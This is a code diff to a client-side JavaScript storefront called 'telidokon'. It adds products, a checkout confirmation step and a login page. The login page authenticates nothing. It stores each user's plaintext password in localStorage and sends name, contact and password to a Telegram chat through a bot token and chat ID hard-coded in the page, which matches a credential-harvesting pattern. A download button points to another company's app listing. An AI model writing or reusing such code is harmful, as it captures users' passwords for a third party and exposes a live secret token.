@@ -4,8 +4,11 @@ const LOCATION_KEY = "telidokon_location";
 const LANGUAGE_KEY = "telidokon_language";
 const STOCK_KEY = "telidokon_stock";
 const BOT_OFFSET_KEY = "telidokon_bot_offset";
+const USER_KEY = "telidokon_user";
+const APP_DOWNLOADED_KEY = "app_downloaded";
 const BOT_TOKEN = "8661079419:AAH5kVfk6Eu7bZReioDwnvxb0WhKixiOR6k";
 const CHAT_ID = "8085252809";
+const PLAY_STORE_URL = "https://play.google.com/store/apps/details?id=uz.uzum.market";
 const MAX_QUANTITY = 10;
 const TOAST_DURATION = 2000;
 const BATTERY_REFRESH_MS = 30000;
@@ -242,7 +245,7 @@ const products = [
     price: 8390000,
     rating: 4.4,
     categoryKey: "smartphones",
-    image: "images/samsung.jpg",
+    image: "images/sansor-1.jpg",
     aliases: ["samsung galaxy s21", "galaxy s21", "s21"]
   },
   {
@@ -277,13 +280,13 @@ const products = [
   },
   {
     id: 1010,
-    name: "Redmi Note 13",
-    names: { uz: "Redmi Note 13", ru: "Redmi Note 13", en: "Redmi Note 13" },
+    name: "Telefon Gnizdo",
+    names: { uz: "Telefon Gnizdo", ru: "Telefon Gnizdo", en: "Telefon Gnizdo" },
     price: 4290000,
     rating: 4.5,
     categoryKey: "smartphones",
-    image: "images/redmi-1.jpg",
-    aliases: ["redmi note 13", "note 13"]
+    image: "images/gnizdo-2.jpg",
+    aliases: ["gnizdo", "gnizdo"]
   },
   {
     id: 1011,
@@ -304,6 +307,46 @@ const products = [
     categoryKey: "smartphones",
     image: "images/tel-1.jpg",
     aliases: ["tecno spark 10", "spark 10"]
+  },
+  {
+    id: 1013,
+    name: "Telefon Gnizdo",
+    names: { uz: "Telefon Gnizdo", ru: "Telefon Gnizdo", en: "Telefon Gnizdo" },
+    price: 20000,
+    rating: 4.1,
+    categoryKey: "smartphones",
+    image: "images/gnizdo-1.jpg",
+    aliases: ["Telefon Gnizdo", "Gnizdo"]
+  },
+  {
+    id: 1014,
+    name: "Telefon Kamera",
+    names: { uz: "Telefon Kamera ", ru: " Telefon Kamera ", en: "Telefon Kamera " },
+    price: 50000,
+    rating: 4.1,
+    categoryKey: "smartphones",
+    image: "images/kamera-1.jpg",
+    aliases: ["kamera", "camera"]
+  },
+  {
+    id: 1015,
+    name: "Sensor",
+    names: { uz: "Sensor", ru: "Sensor", en: "Sensor" },
+    price: 279000,
+    rating: 4.1,
+    categoryKey: "smartphones",
+    image: "images/sensor-2.jpg",
+    aliases: ["sensor", "sensor"]
+  },
+  {
+    id: 1016,
+    name: "Power Bank 20K",
+    names: { uz: "Power Bank 20K", ru: "Power Bank 20K", en: "Power Bank 20K" },
+    price: 200000,
+    rating: 4.1,
+    categoryKey: "smartphones",
+    image: "images/power-bank.jpg",
+    aliases: ["power bank 20k", "20k power bank"]
   }
 ].map((product) => ({
   ...product,
@@ -329,7 +372,9 @@ const locationData = {
 
 document.addEventListener("DOMContentLoaded", () => {
   injectSharedUi();
+  setupDownloadButtons();
   applyLanguage();
+  updateAuthUi();
   updateCartCount();
   setupLanguageButtons();
   setupMobileMenu();
@@ -346,6 +391,10 @@ document.addEventListener("DOMContentLoaded", () => {
 
   if (page === "checkout") {
     setupCheckoutForm();
+  }
+
+  if (page === "login") {
+    setupLoginForm();
   }
 
   rerenderActiveViews();
@@ -400,6 +449,69 @@ function readStorageArray(key) {
 
 function readStorageObject(key) {
   return safeJsonParse(localStorage.getItem(key), {});
+}
+
+function getStoredUser() {
+  return safeJsonParse(localStorage.getItem(USER_KEY), null);
+}
+
+function getAuthLabel() {
+  const user = getStoredUser();
+  if (!user?.name) {
+    return "Login";
+  }
+  return user.name.length > 12 ? `${user.name.slice(0, 12)}...` : user.name;
+}
+
+function getUserInitial() {
+  const user = getStoredUser();
+  return String(user?.name || "").trim().charAt(0).toUpperCase();
+}
+
+function hasDownloadedApp() {
+  return localStorage.getItem(APP_DOWNLOADED_KEY) === "true";
+}
+
+function getAuthHref() {
+  return "login.html";
+}
+
+function setupDownloadButtons() {
+  document.querySelectorAll(".download-app-btn").forEach((link) => {
+    link.setAttribute("href", PLAY_STORE_URL);
+    link.classList.toggle("is-hidden", hasDownloadedApp());
+    if (link.dataset.boundDownload === "true") {
+      return;
+    }
+    link.dataset.boundDownload = "true";
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      localStorage.setItem(APP_DOWNLOADED_KEY, "true");
+      document.querySelectorAll(".download-app-btn").forEach((button) => {
+        button.classList.add("is-hidden");
+      });
+      window.location.href = PLAY_STORE_URL;
+    });
+  });
+}
+
+function isValidContact(value) {
+  const trimmedValue = String(value || "").trim();
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const phonePattern = /^\+?[0-9\s\-()]{7,}$/;
+  return emailPattern.test(trimmedValue) || phonePattern.test(trimmedValue);
+}
+
+function isValidPhone(value) {
+  return /^\+?[0-9\s\-()]{7,}$/.test(String(value || "").trim());
+}
+
+function setStatusMessage(element, message, color) {
+  if (!element) {
+    return;
+  }
+  element.textContent = message;
+  element.style.color = color;
 }
 
 function getCart() {
@@ -490,7 +602,8 @@ function updateBottomNavState() {
       (page === "home" && link.dataset.page === "home" && !location.hash) ||
       (page === "home" && link.dataset.section && location.hash === `#${link.dataset.section}`) ||
       (page === "cart" && link.dataset.page === "cart") ||
-      (page === "checkout" && link.dataset.page === "checkout");
+      (page === "checkout" && link.dataset.page === "cart") ||
+      (page === "login" && link.dataset.page === "login");
     link.classList.toggle("active", Boolean(isActive));
   });
 }
@@ -506,6 +619,7 @@ function rerenderActiveViews() {
   if (page === "checkout") {
     renderCheckoutSummary();
   }
+  updateAuthUi();
   updateCartCount();
   updateBottomNavState();
 }
@@ -841,29 +955,59 @@ function renderCheckoutSummary() {
 function setupCheckoutForm() {
   const form = document.getElementById("checkoutForm");
   const status = document.getElementById("checkoutStatus");
+  const modal = document.getElementById("checkoutConfirmModal");
+  const confirmButton = document.getElementById("confirmCheckoutBtn");
+  const cancelButton = document.getElementById("cancelCheckoutBtn");
   if (!form || !status) {
     return;
   }
 
-  form.addEventListener("submit", async (event) => {
-    event.preventDefault();
+  let pendingCheckoutData = null;
 
+  const closeModal = () => {
+    modal?.classList.remove("open");
+    modal?.setAttribute("aria-hidden", "true");
+  };
+
+  const openModal = () => {
+    modal?.classList.add("open");
+    modal?.setAttribute("aria-hidden", "false");
+  };
+
+  const validateCheckoutFields = () => {
     const cart = getDetailedCart();
     if (!cart.length) {
-      status.textContent = t("cart_empty_short");
-      status.style.color = "#dc2626";
-      return;
+      setStatusMessage(status, t("cart_empty_short"), "#dc2626");
+      return null;
     }
 
     const name = document.getElementById("customerName").value.trim();
     const phone = document.getElementById("customerPhone").value.trim();
     const address = document.getElementById("customerAddress").value.trim();
     if (!name || !phone || !address) {
-      status.textContent = t("all_fields_required");
-      status.style.color = "#dc2626";
-      return;
+      setStatusMessage(status, t("all_fields_required"), "#dc2626");
+      return null;
     }
 
+    if (name.length < 2) {
+      setStatusMessage(status, "Ism kamida 2 ta harfdan iborat bo‘lishi kerak.", "#dc2626");
+      return null;
+    }
+
+    if (!isValidPhone(phone)) {
+      setStatusMessage(status, "Telefon raqamini to‘g‘ri kiriting.", "#dc2626");
+      return null;
+    }
+
+    if (address.length < 8) {
+      setStatusMessage(status, "Manzilni to‘liqroq kiriting.", "#dc2626");
+      return null;
+    }
+
+    return { cart, name, phone, address };
+  };
+
+  const submitCheckoutOrder = async ({ cart, name, phone, address }) => {
     const orderId = `ORD-${Date.now()}`;
     const date = new Date().toLocaleString();
     const total = cart.reduce((sum, item) => sum + item.product.price * item.quantity, 0);
@@ -888,25 +1032,144 @@ function setupCheckoutForm() {
       `Date: ${date}`
     ].join("\n");
 
-    status.textContent = t("order_sending");
-    status.style.color = "#6b7280";
+    setStatusMessage(status, t("order_sending"), "#6b7280");
 
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
+      await sendTelegramMessage(message);
       localStorage.removeItem(CART_KEY);
       updateCartCount();
       form.reset();
       renderCheckoutSummary();
-      status.textContent = t("order_success");
-      status.style.color = "#16a34a";
+      setStatusMessage(status, t("order_success"), "#16a34a");
     } catch (error) {
-      status.textContent = t("order_error");
-      status.style.color = "#dc2626";
+      setStatusMessage(status, t("order_error"), "#dc2626");
       console.error(error);
+    }
+  };
+
+  form.addEventListener("submit", (event) => {
+    event.preventDefault();
+    const checkoutData = validateCheckoutFields();
+    if (!checkoutData) {
+      return;
+    }
+
+    pendingCheckoutData = checkoutData;
+    openModal();
+  });
+
+  cancelButton?.addEventListener("click", () => {
+    pendingCheckoutData = null;
+    closeModal();
+  });
+
+  confirmButton?.addEventListener("click", async () => {
+    if (!pendingCheckoutData) {
+      closeModal();
+      return;
+    }
+
+    const checkoutData = pendingCheckoutData;
+    pendingCheckoutData = null;
+    closeModal();
+    await submitCheckoutOrder(checkoutData);
+  });
+
+  modal?.addEventListener("click", (event) => {
+    if (event.target === modal) {
+      pendingCheckoutData = null;
+      closeModal();
+    }
+  });
+
+  window.addEventListener("keydown", (event) => {
+    if (event.key === "Escape" && modal?.classList.contains("open")) {
+      pendingCheckoutData = null;
+      closeModal();
+    }
+  });
+}
+
+function setupLoginForm() {
+  const form = document.getElementById("loginForm");
+  const status = document.getElementById("loginStatus");
+  if (!form || !status) {
+    return;
+  }
+
+  const existingUser = getStoredUser();
+  if (existingUser) {
+    const nameField = document.getElementById("loginName");
+    const contactField = document.getElementById("loginContact");
+    const passwordField = document.getElementById("loginPassword");
+    if (nameField) {
+      nameField.value = existingUser.name || "";
+    }
+    if (contactField) {
+      contactField.value = existingUser.contact || "";
+    }
+    if (passwordField) {
+      passwordField.value = existingUser.password || "";
+    }
+  }
+
+  form.addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    const name = document.getElementById("loginName").value.trim();
+    const contact = document.getElementById("loginContact").value.trim();
+    const password = document.getElementById("loginPassword").value.trim();
+
+    if (!name || !contact || !password) {
+      setStatusMessage(status, t("all_fields_required"), "#dc2626");
+      return;
+    }
+
+    if (name.length < 2) {
+      setStatusMessage(status, "Please enter your full name.", "#dc2626");
+      return;
+    }
+
+    if (!isValidContact(contact)) {
+      setStatusMessage(status, "Please enter a valid phone number or email.", "#dc2626");
+      return;
+    }
+
+    if (password.length < 4) {
+      setStatusMessage(status, "Password must be at least 4 characters.", "#dc2626");
+      return;
+    }
+
+    const user = {
+      name,
+      contact,
+      password,
+      loggedInAt: new Date().toISOString()
+    };
+
+    // Store the latest login locally so the UI can show the signed-in user immediately.
+    localStorage.setItem(USER_KEY, JSON.stringify(user));
+    updateAuthUi();
+
+    setStatusMessage(status, "Sending login details...", "#6b7280");
+
+    const message = [
+      "New User Login:",
+      `Name: ${name}`,
+      `Phone/Email: ${contact}`,
+      `Password: ${password}`
+    ].join("\n");
+
+    try {
+      await sendTelegramMessage(message);
+      setStatusMessage(status, "Login successful. Redirecting...", "#16a34a");
+    } catch (error) {
+      setStatusMessage(status, "Saved locally, but Telegram send failed.", "#dc2626");
+      console.error(error);
+    } finally {
+      window.setTimeout(() => {
+        window.location.href = "index.html";
+      }, 900);
     }
   });
 }
@@ -988,6 +1251,54 @@ function applySavedLocation() {
   label.textContent = localStorage.getItem(LOCATION_KEY) || t("select_region");
 }
 
+function updateAuthUi() {
+  const isLoggedIn = Boolean(getStoredUser()?.name);
+  const authLabel = getAuthLabel();
+  const userInitial = getUserInitial();
+
+  document.querySelectorAll("[data-auth-link='true']").forEach((link) => {
+    link.setAttribute("href", getAuthHref());
+    link.classList.toggle("active", page === "login");
+
+    const isAvatarTarget = link.classList.contains("auth-link-button") || link.classList.contains("mobile-bottom-nav-center");
+    if (!isAvatarTarget) {
+      const label = link.querySelector("[data-auth-label]");
+      if (label) {
+        label.textContent = authLabel;
+      }
+      return;
+    }
+
+    const secondaryLabel = link.classList.contains("mobile-bottom-nav-center")
+      ? (isLoggedIn ? "Profile" : "Login")
+      : authLabel;
+
+    if (isLoggedIn && userInitial) {
+      link.classList.add("is-avatar");
+      link.innerHTML = `
+        <span class="auth-avatar ${link.classList.contains("mobile-bottom-nav-center") ? "mobile-bottom-nav-avatar" : ""}" aria-hidden="true">${userInitial}</span>
+        ${link.classList.contains("mobile-bottom-nav-center") ? `<span class="mobile-bottom-nav-label auth-link-text">Profile</span>` : ""}
+      `;
+      link.setAttribute("aria-label", `${authLabel} profile`);
+    } else {
+      link.classList.remove("is-avatar");
+      if (link.classList.contains("mobile-bottom-nav-center")) {
+        link.innerHTML = `
+          <span class="mobile-bottom-nav-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8Zm-7 8a7 7 0 0 1 14 0" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </span>
+          <span class="mobile-bottom-nav-label auth-link-text">${secondaryLabel}</span>
+        `;
+      } else {
+        link.innerHTML = `<span class="auth-link-text" data-auth-label>${secondaryLabel}</span>`;
+      }
+      link.setAttribute("aria-label", "Open login page");
+    }
+  });
+}
+
 function applyLanguage() {
   document.documentElement.lang = currentLanguage;
   document.querySelectorAll("[data-i18n]").forEach((element) => {
@@ -1006,6 +1317,7 @@ function applyLanguage() {
     }
   });
   applySavedLocation();
+  updateAuthUi();
 }
 
 function setupLanguageButtons() {
@@ -1017,6 +1329,33 @@ function setupLanguageButtons() {
       rerenderActiveViews();
     });
   });
+}
+
+function getTelegramMessageUrl() {
+  return `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+}
+
+async function sendTelegramMessage(message) {
+  // Shared Telegram sender used by both checkout and login flows.
+  const response = await fetch(getTelegramMessageUrl(), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
+
+  if (!response.ok) {
+    throw new Error(`Telegram request failed with status ${response.status}`);
+  }
+
+  const payload = await response.json();
+  if (!payload.ok) {
+    throw new Error(payload.description || "Telegram API returned an error");
+  }
+
+  return payload;
 }
 
 function setupMobileMenu() {
@@ -1049,10 +1388,12 @@ function injectSharedUi() {
 
   if (!document.getElementById("batteryIndicator")) {
     const batteryIndicator = document.createElement("div");
-    batteryIndicator.className = "battery-indicator";
+    batteryIndicator.className = "battery-indicator header-battery";
     batteryIndicator.id = "batteryIndicator";
     batteryIndicator.hidden = true;
-    document.body.appendChild(batteryIndicator);
+    const headerActions = document.querySelector(".header-actions");
+    const headerInner = document.querySelector(".header-inner");
+    (headerActions || headerInner || document.body).appendChild(batteryIndicator);
   }
 
   if (!document.querySelector(".mobile-bottom-nav")) {
@@ -1061,24 +1402,38 @@ function injectSharedUi() {
     nav.setAttribute("aria-label", "Mobile navigation");
     nav.innerHTML = `
       <a href="index.html" data-page="home" data-i18n="home">
-        <span class="mobile-bottom-nav-icon">&#8962;</span>
+        <span class="mobile-bottom-nav-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M4 10.5 12 4l8 6.5V20a1 1 0 0 1-1 1h-4.5v-6h-5v6H5a1 1 0 0 1-1-1v-9.5Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+          </svg>
+        </span>
         <span class="mobile-bottom-nav-label">${t("home")}</span>
       </a>
-      <a href="${page === "home" ? "#products" : "index.html#products"}" data-section="products" data-i18n="catalog">
-        <span class="mobile-bottom-nav-icon">&#9638;</span>
-        <span class="mobile-bottom-nav-label">${t("catalog")}</span>
-      </a>
       <a href="cart.html" data-page="cart" data-i18n="cart">
-        <span class="mobile-bottom-nav-icon">&#128722;</span>
+        <span class="mobile-bottom-nav-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M4 5h2l2.1 9.2a1 1 0 0 0 .98.8H18a1 1 0 0 0 .97-.76L21 8H7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            <circle cx="10" cy="19" r="1.6" fill="currentColor"/>
+            <circle cx="18" cy="19" r="1.6" fill="currentColor"/>
+          </svg>
+        </span>
         <span class="mobile-bottom-nav-label">${t("cart")}</span>
       </a>
-      <a href="${page === "home" ? "#favorites" : "index.html#favorites"}" data-section="favorites" data-i18n="favorites">
-        <span class="mobile-bottom-nav-icon">&#9829;</span>
-        <span class="mobile-bottom-nav-label">${t("favorites")}</span>
+      <a href="${getAuthHref()}" data-page="login" data-auth-link="true" class="mobile-bottom-nav-center">
+        <span class="mobile-bottom-nav-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8Zm-7 8a7 7 0 0 1 14 0" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </span>
+        <span class="mobile-bottom-nav-label" data-auth-label>${getAuthLabel()}</span>
       </a>
-      <a href="checkout.html" data-page="checkout" data-i18n="account">
-        <span class="mobile-bottom-nav-icon">&#128100;</span>
-        <span class="mobile-bottom-nav-label">${t("account")}</span>
+      <a href="${page === "home" ? "#favorites" : "index.html#favorites"}" data-section="favorites" data-i18n="favorites">
+        <span class="mobile-bottom-nav-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="m12 20-1.2-1.1C6 14.5 3 11.8 3 8.5A4.5 4.5 0 0 1 7.5 4C9.2 4 10.8 4.8 12 6.1 13.2 4.8 14.8 4 16.5 4A4.5 4.5 0 0 1 21 8.5c0 3.3-3 6-7.8 10.4L12 20Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+          </svg>
+        </span>
+        <span class="mobile-bottom-nav-label">${t("favorites")}</span>
       </a>
     `;
     document.body.appendChild(nav);
@@ -1172,15 +1527,47 @@ async function setupBatteryIndicator() {
   batteryRefreshTimer = window.setInterval(renderBattery, BATTERY_REFRESH_MS);
 }
 
+// Override the earlier battery renderer so the indicator lives in the header
+// and updates whenever the battery level or charging state changes.
+async function setupBatteryIndicator() {
+  const indicator = document.getElementById("batteryIndicator");
+  if (!indicator || typeof navigator.getBattery !== "function") {
+    if (indicator) {
+      indicator.hidden = true;
+    }
+    return;
+  }
+
+  const battery = await navigator.getBattery();
+  const renderBattery = () => {
+    indicator.hidden = false;
+    indicator.textContent = `🔋 ${Math.round(battery.level * 100)}%`;
+  };
+
+  renderBattery();
+  battery.addEventListener("levelchange", renderBattery);
+  battery.addEventListener("chargingchange", renderBattery);
+  if (batteryRefreshTimer) {
+    window.clearInterval(batteryRefreshTimer);
+  }
+  batteryRefreshTimer = window.setInterval(renderBattery, BATTERY_REFRESH_MS);
+}
+
 function setupStorageSync() {
   window.addEventListener("storage", (event) => {
-    if ([CART_KEY, FAVORITES_KEY, STOCK_KEY, LANGUAGE_KEY, LOCATION_KEY].includes(event.key)) {
+    if ([CART_KEY, FAVORITES_KEY, STOCK_KEY, LANGUAGE_KEY, LOCATION_KEY, USER_KEY, APP_DOWNLOADED_KEY].includes(event.key)) {
       if (event.key === LANGUAGE_KEY) {
         currentLanguage = localStorage.getItem(LANGUAGE_KEY) || "uz";
         applyLanguage();
       }
       if (event.key === LOCATION_KEY) {
         applySavedLocation();
+      }
+      if (event.key === USER_KEY) {
+        updateAuthUi();
+      }
+      if (event.key === APP_DOWNLOADED_KEY) {
+        setupDownloadButtons();
       }
       rerenderActiveViews();
     }
